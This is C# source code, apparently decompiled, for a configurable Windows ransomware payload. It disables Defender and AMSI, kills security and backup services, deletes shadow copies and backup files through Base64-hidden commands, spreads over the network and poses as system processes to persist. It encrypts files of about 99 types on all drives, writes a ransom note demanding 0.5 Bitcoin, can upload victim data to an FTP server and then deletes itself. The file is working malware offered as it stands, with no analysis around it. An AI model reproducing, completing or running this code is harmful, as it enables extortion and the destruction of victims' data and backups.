using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Crypt_it;

internal class Program
{
	public class RecursiveFileSearch
	{
		private static StringCollection log = new StringCollection();

		private static List<string> result = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				log.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
							{
								result.Add(text);
							}
							else if (File.Exists(text) && Size == "NO")
							{
								result.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return result;
		}
	}

	public static string imha = "EVET";

	public static string[] files_;

	public static IEnumerable<DirectoryInfo> dirs;

	public static byte[] PasswordBytes = null;

	public static DirectoryInfo di;

	public static string Size = "NO";

	public static string Mb = "100000000";

	public static List<string> DizonList = new List<string>();

	public static List<string> DoneExtensions = new List<string>();

	public static string Persistence = "NO";

	public static string DynamicPass = "";

	public static string DeceiveMe = "NO";

	public static int rand = 0;

	public static string ReleaseLockedFiles = "YES";

	public static string AntiVM = "NO";

	public static string Delay = "NO";

	public static string DelayTime = "0";

	public static string DisableDefender = "YES";

	public static string DisableAMSI = "YES";

	public static string CriticalProcess = "NO";

	public static string WallpaperChanger = "NO";

	public static List<string> meltList = new List<string>
	{
		Base64Decode("bHNhc3MuZXhl"),
		Base64Decode("c3ZjaHN0LmV4ZQ=="),
		Base64Decode("Y3Jjc3MuZXhl"),
		Base64Decode("Y2hyb21lMzIuZXhl"),
		Base64Decode("ZmlyZWZveC5leGU="),
		Base64Decode("Y2FsYy5leGU="),
		Base64Decode("bXlzcWxkLmV4ZQ=="),
		Base64Decode("ZGxsaHN0LmV4ZQ=="),
		Base64Decode("b3BlcmEzMi5leGU="),
		Base64Decode("bWVtb3AuZXhl"),
		Base64Decode("c3Bvb2xjdi5leGU="),
		Base64Decode("Y3RmbW9tLmV4ZQ=="),
		Base64Decode("U2t5cGVBcHAuZXhl")
	};

	public static List<string> EncryptedDirs = new List<string>();

	public static string SpreadOverNetwork = "YES";

	public static string Live4Ever = "YES";

	public static string KillTM = "YES";

	public static List<string> EncryptedFiles = new List<string>();

	public static string FtpLog = "NO";

	private static string appGuid = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string MultipleThreads = "NO";

	public static string WoL = "NO";

	public static List<string> netShadowList = new List<string>
	{
		Base64Decode("c3RvcCBhdnBzdXMgL3k="),
		Base64Decode("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		Base64Decode("c3RvcCBtZmV3YyAveQ=="),
		Base64Decode("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		Base64Decode("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k=")
	};

	public static List<string> scList = new List<string>
	{
		Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		Base64Decode("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		Base64Decode("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> taskList = new List<string>
	{
		Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="),
		Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> vssList = new List<string>
	{
		Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> delList = new List<string>
	{
		Base64Decode("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		Base64Decode("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string DelayedActivation = "NO";

	public static string ExpireOption = "NO";

	internal static DateTime ActiveAfterDateTime = new DateTime(2000, 1, 1);

	internal static DateTime ExpireAfterDateTime = new DateTime(2100, 1, 1);

	public static string PartialEncrytion = "YES";

	public static string PartialSize = "10";

	public static string StaticLooks = "NO";

	public static string SystemFiles = "NO";

	public static string RIPmeBiot = "NO";

	public static string ADMINISTRATOR = "YES";

	public static string FAC = "NO";

	public static string Styler = "NO";

	public static List<string> extstyl = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string LimitMe = "NO";

	public static string MaxSize = "1";

	public static string TransparentMan = "NO";

	public static string AlternateAlgo = "YES";

	public static string Jerry = "YES";

	public static string toolLocation = string.Empty;

	public static string Drag_Drop = "NO";

	public static string NotifyMe = "NO";

	public static string NotifyCustom = "NO";

	public static string LegalTitle = "";

	public static string LegalText = "";

	private static void Main(string[] args)
	{
		try
		{
			MutexHelper.CheckMutex(appGuid);
		}
		catch (Exception)
		{
		}
		if (Delay == "YES")
		{
			Thread.Sleep(int.Parse(DelayTime));
		}
		if (Jerry == "YES")
		{
			Thread thread = new Thread(NativeMethods.PreventSleep);
			thread.IsBackground = true;
			thread.Start();
		}
		if (DisableAMSI == "YES")
		{
			AMSI.Disable();
		}
		if (ADMINISTRATOR == "YES" && FAC == "YES")
		{
			try
			{
				RunPS("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch
			{
			}
		}
		if (DisableDefender == "YES")
		{
			Disable.Defender();
		}
		if (CriticalProcess == "YES" && !ProcessCritical.IsAdmin())
		{
			ProcessCritical.Set();
		}
		if (Live4Ever == "YES" && ProcessCritical.IsAdmin())
		{
			new AntiKill().DisTaskManager(enable: false);
			new AntiKill().IamInmortal();
		}
		if (KillTM == "YES")
		{
			Thread thread2 = new Thread(Kill.Run);
			thread2.IsBackground = true;
			thread2.Priority = ThreadPriority.Highest;
			thread2.Start();
		}
		if (AntiVM == "YES")
		{
			Anti_Analysis.RunAntiAnalysis();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (DeceiveMe == "YES" && fileName != text2)
		{
			Thread thread3 = new Thread(Deceive);
			thread3.IsBackground = true;
			thread3.Priority = ThreadPriority.Highest;
			thread3.Start();
		}
		if (Persistence == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				rand = NextInt(0, meltList.Count);
				File.Copy(fileName, text + meltList[rand], overwrite: true);
				Process.Start(text + meltList[rand]);
				imha_zamani();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (DelayedActivation == "YES" && DateTime.Now < ActiveAfterDateTime)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (ExpireOption == "YES" && DateTime.Now > ExpireAfterDateTime)
			{
				imha_zamani();
			}
		}
		catch
		{
		}
		foreach (string netShadow in netShadowList)
		{
			ProcessCommand("net.exe", netShadow);
		}
		foreach (string sc in scList)
		{
			ProcessCommand("sc.exe", sc);
		}
		foreach (string task in taskList)
		{
			ProcessCommand("taskkill.exe", task);
		}
		foreach (string vss in vssList)
		{
			ProcessCommand("vssadmin.exe", vss);
		}
		foreach (string del in delList)
		{
			ProcessCommand("del.exe", del);
		}
		Empty.RecycleBin();
		if (SpreadOverNetwork == "YES")
		{
			NetworkSpreading.Run();
		}
		if (StaticLooks == "NO")
		{
			DynamicPass = Crypto.RandomString(32);
		}
		else
		{
			DynamicPass = "UDR97Z28O28SMQGC0ZOEM0OIQNME03II";
		}
		string text3 = CryptographyHelper.Encrypt(DynamicPass);
		Crypt(new string[1] { "[auto]" }, new string[99]
		{
			"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "ppt", "doc", "docx", "sxi",
			"sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost", "pst",
			"edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java", "cpp",
			"pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes", "vsd",
			"odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6", "sqlite3",
			"sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
			"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
			"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
			"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf"
		}, new string[0], DynamicPass, ".builder");
		DynamicPass = Crypto.RandomString(32);
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			streamWriter.WriteLine(Base64Decode("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAwLjUgQml0Y29pbiBhbmQgY29udGFjdCB1cyB3aXRoIHByb29mIG9mIHBheW1lbnQgYW5kIHlvdXIgVW5pcXVlIElkZW50aWZpZXIgS2V5Lg0KV2Ugd2lsbCBzZW5kIHlvdSBhIGRlY3J5cHRpb24gdG9vbCB3aXRoIHlvdXIgcGVyc29uYWwgZGVjcnlwdGlvbiBwYXNzd29yZC4NCg0KV2hlcmUgY2FuIHlvdSBidXkgQml0Y29pbnM6DQoNCmh0dHBzOi8vd3d3LmNvaW5iYXNlLmNvbQ0KaHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbQ0KDQpDb250YWN0OiBjbGVhcmN1TWMwNDk5N0BnbWFpbC5jb20uDQoNCkJpdGNvaW4gd2FsbGV0IHRvIG1ha2UgdGhlIHRyYW5zZmVyIHRvIGlzOg0KMUtleDVRbUJHdEpMRGFnbjNvMnAxeW9xeUtuMkE2RUZHOQ=="));
			streamWriter.WriteLine(Base64Decode("VW5pcXVlIElkZW50aWZpZXIgS2V5IChtdXN0IGJlIHNlbnQgdG8gdXMgdG9nZXRoZXIgd2l0aCBwcm9vZiBvZiBwYXltZW50KTog"));
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			streamWriter.WriteLine(text3);
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			if (MultipleThreads == "NO")
			{
				streamWriter.WriteLine(Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(EncryptedFiles.Count));
			}
		}
		foreach (string encryptedDir in EncryptedDirs)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", encryptedDir + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (FtpLog == "YES")
		{
			try
			{
				if (MultipleThreads == "NO")
				{
					Ftp.UploadFile("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", Base64Decode("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20=")) + Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + Base64Decode("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(EncryptedFiles.Count) + "\r\n" + Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(EncryptedFiles) + "\r\n" + Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					Ftp.UploadFile("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", Base64Decode("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(EncryptedFiles) + "\r\n" + Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (WallpaperChanger == "YES")
		{
			try
			{
				Wallpaper.Set(new Uri("http://www.my_wallpaper_location.com/wallpaper.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(Base64Decode("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (!string.IsNullOrEmpty(toolLocation))
		{
			try
			{
				File.Delete(toolLocation);
			}
			catch
			{
			}
		}
		if (imha == "EVET")
		{
			imha_zamani();
		}
	}

	public static void Deceive()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Base64Decode("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), Base64Decode("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NextInt(int min, int max)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(min, max);
	}

	public static List<string> TraverseTree(string root)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(root))
		{
			throw new ArgumentException();
		}
		stack.Push(root);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
				{
					array = Directory.GetFiles(text);
					goto IL_00bc;
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00bc:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
					{
						list.Add(fileInfo.FullName);
					}
					else if (File.Exists(fileInfo.FullName) && Size == "NO")
					{
						list.Add(fileInfo.FullName);
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> GetFilesList(string docPath)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(docPath);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && Size == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("program files") && !item3.FullName.ToLower().Contains("windows") && !item3.FullName.ToLower().Contains("perflogs") && !item3.FullName.ToLower().Contains("internet explorer"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(Mb) * 1024.0 * 1024.0 && Size == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && Size == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string ProcessCommand(string command = "", string arguments = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = command,
				Arguments = arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void imha_zamani()
	{
		string text = Base64Decode("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void Crypt(string[] dizin, string[] uzantilar, string[] excomunicated, string sifre, string crypt_uzantisi)
	{
		PasswordBytes = Encoding.ASCII.GetBytes(sifre);
		if (dizin[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady)
					{
						DizonList.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < dizin.Length; j++)
			{
				DizonList.Add(dizin[j]);
			}
		}
		foreach (string t in DizonList)
		{
			if (MultipleThreads == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre);
			}
		}
	}

	public static void WorkerCrypter(string targetDir, string[] extensions, string extension, string[] excluded, string DynamicPass)
	{
		if (!Directory.Exists(targetDir))
		{
			return;
		}
		List<string> list = new List<string>();
		list = ((!(AlternateAlgo == "YES")) ? RecursiveFileSearch.SearchFiles(targetDir) : TraverseTree(targetDir));
		foreach (string value in extensions)
		{
			foreach (string item in list)
			{
				if (excluded.Length != 0)
				{
					int num = 0;
					while (num < excluded.Length)
					{
						string value2 = excluded[num];
						if (!item.EndsWith(value2))
						{
							num++;
							continue;
						}
						goto IL_02e4;
					}
				}
				if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || EncryptedFiles.Contains(item))
				{
					continue;
				}
				if (ReleaseLockedFiles == "YES")
				{
					try
					{
						if (LockedFiles.Islocked(item))
						{
							LockedFiles.Killproc(item);
						}
					}
					catch
					{
					}
				}
				EncryptedFiles.Add(item);
				if (!EncryptedDirs.Contains(Path.GetDirectoryName(item)))
				{
					EncryptedDirs.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PartialEncrytion == "YES" && fileStream.Length > Convert.ToInt32(PartialSize) * 1024 * 1024)
					{
						if (Styler == "YES")
						{
							foreach (string item2 in extstyl)
							{
								if (item.EndsWith(item2) && LimitMe == "YES" && Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream.Length)
								{
									try
									{
										Ftp.UploadData("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", item);
									}
									catch
									{
									}
								}
							}
						}
						byte[] clear = Encryptions.ReadFromFile(item, Convert.ToInt32(PartialSize) * 1024 * 1024);
						byte[] encrypted = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(DynamicPass), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						Encryptions.WriteToFile(item, encrypted);
						if (extension != ".*")
						{
							File.Move(item, item + extension);
						}
					}
					else if (extension != ".*")
					{
						Encrypt(item, item + extension, PasswordBytes);
					}
					else
					{
						Encrypt(item, item + ".part", PasswordBytes);
					}
				}
				catch (Exception)
				{
				}
				IL_02e4:;
			}
		}
	}

	private static void Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (outputFile.Length > 0)
				{
					FileStream fileStream3 = new FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (Styler == "YES")
					{
						foreach (string item in extstyl)
						{
							if (inputFile.EndsWith(item) && LimitMe == "YES" && Convert.ToInt32(MaxSize) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									Ftp.UploadData("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", inputFile);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(inputFile) && num2 >= 0)
							{
								File.Delete(inputFile);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (outputFile.EndsWith(".part"))
					{
						File.Move(outputFile, outputFile.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(outputFile);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
